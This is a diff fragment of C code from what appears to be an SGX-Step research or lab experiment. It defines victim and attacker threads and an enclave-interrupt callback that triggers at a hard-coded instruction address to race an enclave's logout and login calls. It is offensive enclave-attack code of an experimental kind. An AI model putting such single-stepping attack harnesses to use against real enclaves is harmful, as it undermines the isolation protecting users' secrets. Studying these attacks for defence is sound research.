@@ -63,7 +63,7 @@ void aep_cb_func(void)
     info("^^ enclave RIP=%#llx", erip);
 
     
-    if(erip == 0x20e2){ // logout between line 38 and 39
+    if(erip == 0x20d6){ // logout between line 38 and 39
         info("testreach");
         //sgx_step_do_trap = 0;
 
@@ -203,7 +203,7 @@ void* victim_thread(void* arg) {
     printf("victim thread running\n");
 
     sgx_enclave_id_t eidarg = *(sgx_enclave_id_t*)arg;
-    int rv = 1;
+    char* rv;
 
     // Suppose these are secret and sent over an encrypted channel VRAAG
     int deviceId = 1234; 
@@ -213,7 +213,7 @@ void* victim_thread(void* arg) {
 
     attacker_config_page_table();
 
-    ecall_logout(eidarg, deviceId);
+    ecall_logout( eidarg, deviceId);
 
     
 
@@ -245,13 +245,15 @@ void* attacker_thread1(void* arg) {
     sgx_enclave_id_t eidarg = *(sgx_enclave_id_t*)arg;
 
 
-    attacker_config_page_table();
-    do_irq = 0; trigger_cnt = 0, irq_cnt = 0, step_cnt = 0, fault_cnt = 0;
-    sgx_step_do_trap = 0;
+    //attacker_config_page_table();
+    
+    char* rv;
 
     // deviceId used by the attacker
     int deviceId = 5678; 
     char* password = "attacker_dummy";
+
+    attacker_config_page_table();
     ecall_login(eidarg, deviceId, password);
     
     // CHANGE FROM THREAD B TO THREAD A
